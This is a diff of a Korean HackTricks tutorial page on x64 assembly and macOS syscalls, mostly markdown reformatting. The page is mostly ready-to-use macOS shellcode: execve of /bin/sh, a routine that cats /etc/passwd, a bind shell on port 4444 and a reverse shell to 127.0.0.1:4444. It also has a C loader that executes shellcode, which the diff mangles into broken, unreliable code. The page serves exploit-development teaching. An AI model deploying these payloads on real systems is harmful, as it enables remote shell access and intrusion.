@@ -1,4 +1,4 @@
-# x64 소개
+# Introduction to x64
 
 <details>
 
@@ -9,7 +9,7 @@ HackTricks를 지원하는 다른 방법:
 * **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
 * [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
 * [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
-* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
+* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)을 **팔로우**하세요.
 * **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.
 
 </details>
@@ -29,14 +29,14 @@ x64는 x86 아키텍처를 확장하여 `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`
 5. **`rbp`** - 스택 프레임의 **베이스 포인터**입니다.
 6. **`rsp`** - 스택의 맨 위를 추적하는 **스택 포인터**입니다.
 7. **`rsi`** 및 **`rdi`** - 문자열/메모리 작업에서 **소스** 및 **대상** 인덱스로 사용됩니다.
-8. **`r8`**에서 **`r15`**까지 - x64에서 도입된 추가 범용 레지스터입니다.
+8. \*\*`r8`\*\*에서 \*\*`r15`\*\*까지 - x64에서 도입된 추가 범용 레지스터입니다.
 
 ### **호출 규약**
 
 x64 호출 규약은 운영 체제에 따라 다릅니다. 예를 들어:
 
-* **Windows**: 처음 **네 개의 매개변수**는 레지스터 **`rcx`**, **`rdx`**, **`r8`**, **`r9`**에 전달됩니다. 추가 매개변수는 스택에 푸시됩니다. 반환 값은 **`rax`**에 있습니다.
-* **System V (UNIX와 유사한 시스템에서 일반적으로 사용됨)**: 처음 **여섯 개의 정수 또는 포인터 매개변수**는 레지스터 **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`**, **`r9`**에 전달됩니다. 반환 값도 **`rax`**에 있습니다.
+* **Windows**: 처음 **네 개의 매개변수**는 레지스터 **`rcx`**, **`rdx`**, **`r8`**, \*\*`r9`\*\*에 전달됩니다. 추가 매개변수는 스택에 푸시됩니다. 반환 값은 \*\*`rax`\*\*에 있습니다.
+* **System V (UNIX와 유사한 시스템에서 일반적으로 사용됨)**: 처음 **여섯 개의 정수 또는 포인터 매개변수**는 레지스터 **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`**, \*\*`r9`\*\*에 전달됩니다. 반환 값도 \*\*`rax`\*\*에 있습니다.
 
 함수에 여섯 개 이상의 입력이 있는 경우 **나머지는 스택에 전달**됩니다. **RSP**, 스택 포인터는 **16바이트 정렬**이 되어야 하며, 즉, 호출이 발생하기 전에 가리키는 주소가 16으로 나누어 떨어져야 합니다. 이는 일반적으로 우리가 함수 호출 전에 적절하게 RSP를 정렬해야 함을 의미합니다. 그러나 실제로는 이 요구 사항을 충족시키지 않아도 시스템 호출이 많은 경우에도 작동합니다.
 
@@ -73,12 +73,14 @@ x64 명령어는 이전 x86 명령어와의 호환성을 유지하면서 새로�
 
 ### **함수 에필로그**
 
-1. **현재 베이
+1. \*\*현재 베이
+
 ## macOS
 
 ### syscalls
 
 다양한 종류의 syscalls가 있습니다. [**여기에서 찾을 수 있습니다**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall\_sw.h)**:**
+
 ```c
 #define SYSCALL_CLASS_NONE	0	/* Invalid */
 #define SYSCALL_CLASS_MACH	1	/* Mach */
@@ -87,7 +89,9 @@ x64 명령어는 이전 x86 명령어와의 호환성을 유지하면서 새로�
 #define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
 #define SYSCALL_CLASS_IPC	5	/* Mach IPC */
 ```
-그럼, 각 시스콜 번호를 [**이 URL에서**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)** 찾을 수 있습니다:**
+
+그럼, 각 시스콜 번호를 [**이 URL에서**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)\*\* 찾을 수 있습니다:\*\*
+
 ```c
 0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
 1	AUE_EXIT	ALL	{ void exit(int rval); }
@@ -104,6 +108,7 @@ x64 명령어는 이전 x86 명령어와의 호환성을 유지하면서 새로�
 12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
 [...]
 ```
+
 그래서 **Unix/BSD 클래스**에서 `open` 시스콜(**5**)을 호출하려면 다음과 같이 추가해야 합니다: `0x2000000`
 
 따라서 open을 호출하기 위한 시스콜 번호는 `0x2000005`가 됩니다.
@@ -136,59 +141,42 @@ otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g'
 <details>
 
 <summary>쉘코드를 테스트하기 위한 C 코드</summary>
-```c
-// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
-// gcc loader.c -o loader
-#include <stdio.h>
-#include <sys/mman.h>
-#include <string.h>
-#include <stdlib.h>
 
-int (*sc)();
+\`\`\`c // code from https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/helper/loader.c // gcc loader.c -o loader #include #include #include #include
 
-char shellcode[] = "<INSERT SHELLCODE HERE>";
+int (\*sc)();
 
-int main(int argc, char **argv) {
-printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));
+char shellcode\[] = "";
 
-void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);
+int main(int argc, char \*\*argv) { printf("\[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));
 
-if (ptr == MAP_FAILED) {
-perror("mmap");
-exit(-1);
-}
-printf("[+] SUCCESS: mmap\n");
-printf("    |-> Return = %p\n", ptr);
+void \*ptr = mmap(0, 0x1000, PROT\_WRITE | PROT\_READ, MAP\_ANON | MAP\_PRIVATE | MAP\_JIT, -1, 0);
 
-void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
-printf("[+] SUCCESS: memcpy\n");
-printf("    |-> Return = %p\n", dst);
+if (ptr == MAP\_FAILED) { perror("mmap"); exit(-1); } printf("\[+] SUCCESS: mmap\n"); printf(" |-> Return = %p\n", ptr);
 
-int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);
+void \*dst = memcpy(ptr, shellcode, sizeof(shellcode)); printf("\[+] SUCCESS: memcpy\n"); printf(" |-> Return = %p\n", dst);
 
-if (status == -1) {
-perror("mprotect");
-exit(-1);
-}
-printf("[+] SUCCESS: mprotect\n");
-printf("    |-> Return = %d\n", status);
+int status = mprotect(ptr, 0x1000, PROT\_EXEC | PROT\_READ);
 
-printf("[>] Trying to execute shellcode...\n");
+if (status == -1) { perror("mprotect"); exit(-1); } printf("\[+] SUCCESS: mprotect\n"); printf(" |-> Return = %d\n", status);
 
-sc = ptr;
-sc();
+printf("\[>] Trying to execute shellcode...\n");
 
-return 0;
-}
-```
+sc = ptr; sc();
+
+return 0; }
+
+````
 </details>
 
 #### 쉘
 
 [**여기**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s)에서 가져온 내용이며 설명되어 있습니다.
 
-{% tabs %}
-{% tab title="adr를 사용한 경우" %}
+<div data-gb-custom-block data-tag="tabs">
+
+<div data-gb-custom-block data-tag="tab" data-title='adr를 사용한 경우'></div>
+
 ```armasm
 bits 64
 global _main
@@ -202,8 +190,8 @@ push    59                ; put 59 on the stack (execve syscall)
 pop     rax               ; pop it to RAX
 bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
 syscall
-```
-{% tab title="스택을 사용하여" %}
+````
+
 ```armasm
 bits 64
 global _main
@@ -219,12 +207,11 @@ pop     rax               ; pop it to RAX
 bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
 syscall
 ```
-{% endtab %}
-{% endtabs %}
 
-#### cat으로 읽기
+**cat으로 읽기**
 
 목표는 `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`를 실행하는 것이므로, 두 번째 인자 (x1)는 매개변수의 배열입니다 (메모리에서는 주소의 스택을 의미합니다).
+
 ```armasm
 bits 64
 section .text
@@ -255,7 +242,9 @@ section .data
 cat_path:      db "/bin/cat", 0
 passwd_path:   db "/etc/passwd", 0
 ```
-#### sh를 사용하여 명령 실행하기
+
+**sh를 사용하여 명령 실행하기**
+
 ```armasm
 bits 64
 section .text
@@ -293,9 +282,11 @@ sh_path:        db "/bin/sh", 0
 sh_c_option:    db "-c", 0
 touch_command:  db "touch /tmp/lalala", 0
 ```
-#### 바인드 쉘
+
+**바인드 쉘**
 
 [https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html)에서 가져온 **포트 4444**의 바인드 쉘입니다.
+
 ```armasm
 section .text
 global _main
@@ -370,9 +361,11 @@ mov  rax, r8
 mov  al, 0x3b
 syscall
 ```
-#### 리버스 쉘
+
+**리버스 쉘**
 
 [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html)에서 가져온 리버스 쉘입니다. **127.0.0.1:4444**로 리버스 쉘을 실행합니다.
+
 ```armasm
 section .text
 global _main
@@ -434,16 +427,7 @@ mov  rax, r8
 mov  al, 0x3b
 syscall
 ```
-<details>
 
-<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>
 
-HackTricks를 지원하는 다른 방법:
-
-* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
-* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
-* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
-* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.
 
 </details>
